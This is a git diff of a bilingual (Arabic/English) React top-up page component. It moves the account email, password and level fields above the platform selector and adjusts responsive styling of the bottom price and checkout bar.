@@ -419,9 +419,58 @@ export default function Charge() {
           </div>
 
           <div className="space-y-5">
+            <div className="grid gap-4 md:grid-cols-2">
+              <div className="flex flex-col gap-1 w-full">
+                <input
+                  type="text"
+                  placeholder={t('account_email')}
+                  value={email}
+                  disabled={!!user?.temp_email}
+                  onChange={(e) => setEmail(e.target.value)}
+                  className="w-full rounded-xl border border-gray-300 bg-gray-50 p-4 text-sm font-medium text-gray-900 outline-none transition-all placeholder:text-gray-400 focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100 disabled:opacity-75 disabled:cursor-not-allowed disabled:bg-gray-100"
+                />
+              </div>
+              <div className="relative">
+                <input
+                  type={showPassword ? "text" : "password"}
+                  placeholder={t('account_password')}
+                  value={platformPassword}
+                  onChange={(e) => setPlatformPassword(e.target.value)}
+                  className="w-full rounded-xl border border-gray-300 bg-gray-50 p-4 pr-12 text-sm font-medium text-gray-900 outline-none transition-all placeholder:text-gray-400 focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100 rtl:pl-12 rtl:pr-4"
+                />
+                <button
+                  type="button"
+                  onClick={() => setShowPassword(!showPassword)}
+                  className={`absolute top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors ${language === 'ar' ? 'left-4' : 'right-4'}`}
+                >
+                  {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
+                </button>
+              </div>
+              <input
+                type="number"
+                placeholder={t('account_level')}
+                value={level}
+                onChange={(e) => setLevel(e.target.value)}
+                className="w-full rounded-xl border border-gray-300 bg-gray-50 p-4 text-sm font-medium text-gray-900 outline-none transition-all placeholder:text-gray-400 focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100"
+              />
+              <div className="relative">
+                <select
+                  value={charged}
+                  onChange={(e) => setCharged(e.target.value)}
+                  className={`w-full rounded-xl border border-gray-300 bg-gray-50 p-4 text-sm font-medium text-gray-900 outline-none transition-all focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100 appearance-none ${language === 'en' ? 'pl-10' : 'pr-4'}`}
+                >
+                  <option value="لا">{t('charged_before')} - {t('no')}</option>
+                  <option value="نعم">{t('charged_before')} - {t('yes')}</option>
+                </select>
+                <div className={`pointer-events-none absolute ${language === 'ar' ? 'left-4' : 'right-4'} top-1/2 -translate-y-1/2 text-gray-500`}>
+                  <ChevronDown className="h-5 w-5" />
+                </div>
+              </div>
+            </div>
+
             <div className="space-y-3">
               <label className="block text-sm font-bold text-gray-700">
-                {t('platform_type')}
+                {language === 'ar' ? 'اختر نوع المنصة الرئيسية' : 'Choose Main Platform Type'}
                 <Info className={`inline h-4 w-4 text-gray-400 ${language === 'ar' ? 'mr-2' : 'ml-2'}`} />
               </label>
               <div className="flex gap-3 justify-center md:justify-start flex-wrap">
@@ -486,55 +535,6 @@ export default function Charge() {
                     )}
                   </button>
                 ))}
-              </div>
-            </div>
-
-            <div className="grid gap-4 md:grid-cols-2">
-              <div className="flex flex-col gap-1 w-full">
-                <input
-                  type="text"
-                  placeholder={t('account_email')}
-                  value={email}
-                  disabled={!!user?.temp_email}
-                  onChange={(e) => setEmail(e.target.value)}
-                  className="w-full rounded-xl border border-gray-300 bg-gray-50 p-4 text-sm font-medium text-gray-900 outline-none transition-all placeholder:text-gray-400 focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100 disabled:opacity-75 disabled:cursor-not-allowed disabled:bg-gray-100"
-                />
-              </div>
-              <div className="relative">
-                <input
-                  type={showPassword ? "text" : "password"}
-                  placeholder={t('account_password')}
-                  value={platformPassword}
-                  onChange={(e) => setPlatformPassword(e.target.value)}
-                  className="w-full rounded-xl border border-gray-300 bg-gray-50 p-4 pr-12 text-sm font-medium text-gray-900 outline-none transition-all placeholder:text-gray-400 focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100 rtl:pl-12 rtl:pr-4"
-                />
-                <button
-                  type="button"
-                  onClick={() => setShowPassword(!showPassword)}
-                  className={`absolute top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors ${language === 'ar' ? 'left-4' : 'right-4'}`}
-                >
-                  {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
-                </button>
-              </div>
-              <input
-                type="number"
-                placeholder={t('account_level')}
-                value={level}
-                onChange={(e) => setLevel(e.target.value)}
-                className="w-full rounded-xl border border-gray-300 bg-gray-50 p-4 text-sm font-medium text-gray-900 outline-none transition-all placeholder:text-gray-400 focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100"
-              />
-              <div className="relative">
-                <select
-                  value={charged}
-                  onChange={(e) => setCharged(e.target.value)}
-                  className={`w-full rounded-xl border border-gray-300 bg-gray-50 p-4 text-sm font-medium text-gray-900 outline-none transition-all focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100 appearance-none ${language === 'en' ? 'pl-10' : 'pr-4'}`}
-                >
-                  <option value="لا">{t('charged_before')} - {t('no')}</option>
-                  <option value="نعم">{t('charged_before')} - {t('yes')}</option>
-                </select>
-                <div className={`pointer-events-none absolute ${language === 'ar' ? 'left-4' : 'right-4'} top-1/2 -translate-y-1/2 text-gray-500`}>
-                  <ChevronDown className="h-5 w-5" />
-                </div>
               </div>
             </div>
           </div>
@@ -751,26 +751,26 @@ export default function Charge() {
         className="fixed bottom-0 left-0 right-0 z-50 border-t border-gray-100 bg-white px-4 pt-3 pb-4 shadow-[0_-8px_30px_rgba(0,0,0,0.08)] block w-full"
         style={{ paddingBottom: 'max(1rem, env(safe-area-inset-bottom))' }}
       >
-        <div className={`mx-auto flex max-w-4xl items-center justify-between gap-3 ${language === 'en' ? 'flex-row-reverse' : ''}`}>
+        <div className={`mx-auto flex max-w-4xl items-center justify-between gap-1 sm:gap-3 ${language === 'en' ? 'flex-row-reverse' : ''}`}>
             {/* Price Info */}
-            <div className={`flex flex-col ${language === 'en' ? 'items-start' : 'items-end'} leading-none`}>
-              <div className="flex items-center gap-1.5 mb-1.5">
-                <div className="flex items-center">
+            <div className={`flex flex-col ${language === 'en' ? 'items-start' : 'items-end'} leading-none shrink min-w-0 pr-1`}>
+              <div className="flex items-center gap-1 sm:gap-1.5 mb-1 sm:mb-1.5 ml-1">
+                <div className="flex items-center min-w-0">
                   {selectedInfo.bonus && selectedInfo.bonus !== "0" && (
-                     <span className={`text-[#CD1212] font-black text-sm ${language === 'ar' ? 'ml-1.5' : 'mr-1.5'}`}>
+                    <span className={`text-[#CD1212] font-black text-xs sm:text-sm whitespace-nowrap ${language === 'ar' ? 'ml-1 sm:ml-1.5' : 'mr-1 sm:mr-1.5'}`}>
                       {selectedInfo.bonus} +
                     </span>
                   )}
-                  <span className="text-2xl font-black text-gray-900 leading-none">
+                  <span className="text-lg sm:text-2xl font-black text-gray-900 leading-none truncate">
                     {selectedInfo.amount}
                   </span>
                 </div>
                 <svg
-                  width="22"
-                  height="22"
+                  width="18"
+                  height="18"
                   viewBox="0 0 24 24"
                   fill="none"
-                  className={`text-blue-400 drop-shadow-sm ${language === 'ar' ? 'ml-1' : 'mr-1'}`}
+                  className={`text-blue-400 drop-shadow-sm flex-shrink-0 ${language === 'ar' ? 'ml-1' : 'mr-1'} sm:w-[22px] sm:h-[22px]`}
                 >
                   <path d="M6 3L3 8L12 21L21 8L18 3H6Z" fill="currentColor" />
                   <path
@@ -780,23 +780,23 @@ export default function Charge() {
                   />
                 </svg>
               </div>
-              <div className="text-sm font-bold whitespace-nowrap">
+              <div className="text-xs sm:text-sm font-bold whitespace-nowrap">
                 <span className="text-gray-500">{t('total_label')}</span>
-                <span className={`text-[#CD1212] font-black text-xl ${language === 'ar' ? 'ml-1.5' : 'mr-1.5'}`}>
+                <span className={`text-gray-900 font-black text-sm sm:text-xl ${language === 'ar' ? 'ml-1 sm:ml-1.5' : 'mr-1 sm:mr-1.5'}`}>
                   DZD {Number(selectedInfo.price).toLocaleString()}
                 </span>
               </div>
             </div>
 
             {/* Buy Button */}
-            <div className="flex items-center gap-2">
+            <div className="flex items-center gap-1.5 sm:gap-2 flex-shrink-0">
               {currentStep > 1 && (
                 <button
                   onClick={() => {
                     setCurrentStep(prev => prev - 1);
                     window.scrollTo({ top: 0, behavior: 'smooth' });
                   }}
-                  className="flex items-center justify-center rounded-xl bg-gray-100 px-4 py-2.5 text-lg font-black text-gray-700 shadow-sm transition-all hover:bg-gray-200"
+                  className="flex items-center justify-center rounded-lg sm:rounded-xl bg-gray-100 px-3 py-2 sm:px-4 sm:py-2.5 text-sm sm:text-lg font-black text-gray-700 shadow-sm transition-all hover:bg-gray-200 whitespace-nowrap"
                 >
                   {language === 'ar' ? 'السابق' : 'Back'}
                 </button>
@@ -804,7 +804,7 @@ export default function Charge() {
               {currentStep === 1 && (
                 <button
                   onClick={handleNextStep1}
-                  className="flex items-center justify-center gap-2 rounded-xl px-5 py-2.5 text-lg font-black text-white shadow-md active:scale-95 transition-all text-center whitespace-nowrap bg-[#CD1212] shadow-red-600/20 hover:bg-red-700"
+                  className="flex items-center justify-center gap-1.5 sm:gap-2 rounded-lg sm:rounded-xl px-3 py-2 sm:px-5 sm:py-2.5 text-sm sm:text-lg font-black text-white shadow-md active:scale-95 transition-all text-center whitespace-nowrap bg-[#CD1212] shadow-red-600/20 hover:bg-red-700"
                 >
                   {language === 'ar' ? 'التالي' : 'Next'}
                 </button>
@@ -812,7 +812,7 @@ export default function Charge() {
               {currentStep === 2 && (
                 <button
                   onClick={handleNextStep2}
-                  className="flex items-center justify-center gap-2 rounded-xl px-5 py-2.5 text-lg font-black text-white shadow-md active:scale-95 transition-all text-center whitespace-nowrap bg-[#CD1212] shadow-red-600/20 hover:bg-red-700"
+                  className="flex items-center justify-center gap-1.5 sm:gap-2 rounded-lg sm:rounded-xl px-3 py-2 sm:px-5 sm:py-2.5 text-sm sm:text-lg font-black text-white shadow-md active:scale-95 transition-all text-center whitespace-nowrap bg-[#CD1212] shadow-red-600/20 hover:bg-red-700"
                 >
                   {language === 'ar' ? 'التالي' : 'Next'}
                 </button>
@@ -821,9 +821,9 @@ export default function Charge() {
                 <button
                   onClick={handleNextStep3}
                   disabled={showProcess}
-                  className="flex items-center justify-center gap-2 rounded-xl px-5 py-2.5 text-lg font-black text-white shadow-md active:scale-95 transition-all text-center whitespace-nowrap bg-[#CD1212] shadow-red-600/20 hover:bg-red-700 disabled:bg-gray-400 disabled:opacity-60 disabled:shadow-none"
+                  className="flex items-center justify-center gap-1.5 sm:gap-2 rounded-lg sm:rounded-xl px-3 py-2 sm:px-5 sm:py-2.5 text-sm sm:text-lg font-black text-white shadow-md active:scale-95 transition-all text-center whitespace-nowrap bg-[#CD1212] shadow-red-600/20 hover:bg-red-700 disabled:bg-gray-400 disabled:opacity-60 disabled:shadow-none"
                 >
-                  <div className="flex h-5 w-5 items-center justify-center rounded-md border-2 border-white/50">
+                  <div className="flex h-4 w-4 sm:h-5 sm:w-5 items-center justify-center rounded-[4px] border-2 border-white/50">
                     <ShieldCheck className="h-3 w-3" />
                   </div>
                   {showProcess ? 'جاري...' : t('buy_now')}
